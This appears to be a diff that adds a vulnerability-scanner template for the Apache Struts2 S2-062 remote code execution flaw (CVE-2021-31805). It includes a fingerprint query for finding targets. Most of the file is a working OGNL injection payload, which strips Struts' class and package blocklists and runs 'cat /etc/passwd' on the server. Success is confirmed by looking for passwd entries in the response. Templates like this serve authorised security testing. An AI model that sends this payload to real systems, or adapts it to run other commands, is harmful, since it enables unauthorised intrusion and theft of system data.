@@ -1,0 +1,29 @@
+name: Apache Struts2 S2-062 RCE CVE-2021-31805
+manual: true
+query: app="struts2" || app="java" || app="jsp" || product="JAVA" || product="JSP"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: ""
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
+      body: "------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data;
+        name=\"id\"\r\n\r\n%{(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0).(#request.map.setBean(#request.get('struts.valueStack'))
+        == true).toString().substring(0,0).(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0).(#request.map2.setBean(#request.get('map').get('context'))
+        == true).toString().substring(0,0).(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0).(#request.map3.setBean(#request.get('map2').get('memberAccess'))
+        == true).toString().substring(0,0).(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet())
+        == true).toString().substring(0,0).(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet())
+        == true).toString().substring(0,0).(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'cat
+        /etc/passwd'}))}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--"
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"root:x:") && response.body.bcontains(b"daemon:x:")
+expression: r0()
+detail:
+  links:
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-31805
+  - https://cwiki.apache.org/confluence/display/WW/S2-062
+  description: Struts2 is a popular and mature web application framework based on
+    the MVC design pattern.
+  tags: rce
